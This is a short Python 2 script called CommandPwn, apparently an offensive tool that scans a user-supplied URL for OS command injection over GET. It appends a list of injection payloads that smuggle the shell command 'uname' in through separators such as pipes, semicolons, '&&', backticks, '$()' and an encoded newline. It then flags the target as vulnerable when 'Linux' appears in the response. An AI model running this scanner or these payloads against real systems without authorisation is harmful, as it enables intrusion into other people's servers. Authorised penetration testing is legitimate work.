#!/usr/bin/env python
#_*_ coding:utf-8 _*_
#
# CommandPwn - v1.0
#
#   ______                                          ______               
#  / ____/___  ____ ___  ____ ___  ____ _____  ____/ / __ \_      ______ 
# / /   / __ \/ __ `__ \/ __ `__ \/ __ `/ __ \/ __  / /_/ / | /| / / __ \
#/ /___/ /_/ / / / / / / / / / / / /_/ / / / / /_/ / ____/| |/ |/ / / / /
#\____/\____/_/ /_/ /_/_/ /_/ /_/\__,_/_/ /_/\__,_/_/     |__/|__/_/ /_/ 
#                                                                        
#
# - Jonatas Fil (Dkr)
# 
# More info: https://www.owasp.org/index.php/Command_Injection
#
# Greats: HackerSecurity - OWASP - THX - Julio
#########################################################################

from urllib import urlopen
import os
import readline

# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except:
    pass


payload =	['|uname',';uname','&& uname','0.0.0.0|uname','0.0.0.0;uname','0.0.0.0 && uname','0.0.0.0;`uname`','`uname`','$(uname)','%0auname','0.0.0.0|uname&submit=Ping%21']


def inicio():
	print """\n             

 _____                                           _______                
/  __ \                                         | | ___ \               
| /  \/ ___  _ __ ___  _ __ ___   __ _ _ __   __| | |_/ /_      ___ __  
| |    / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` |  __/\ \ /\ / / '_ \ 
| \__/\ (_) | | | | | | | | | | | (_| | | | | (_| | |    \ V  V /| | | |
 \____/\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_\_|     \_/\_/ |_| |_|
                                                                        
             [!] Tool for Command Injection/Execution via GET [!]    
              https://www.owasp.org/index.php/Command_Injection                                              
                       Jonatas Fil (Dkr)\n""" 

def main():
	inicio()
	check()

def check():
	target =  raw_input("\nTarget: ")
	for command in payload:
		command = command.replace("\n", "").replace("\r", "")
		find = urlopen(target+command)
		if find.getcode() == 200:
			scan = find.read()
			if 'Linux' in scan:
				print "\nVulnerable: "+target+command+""

main()
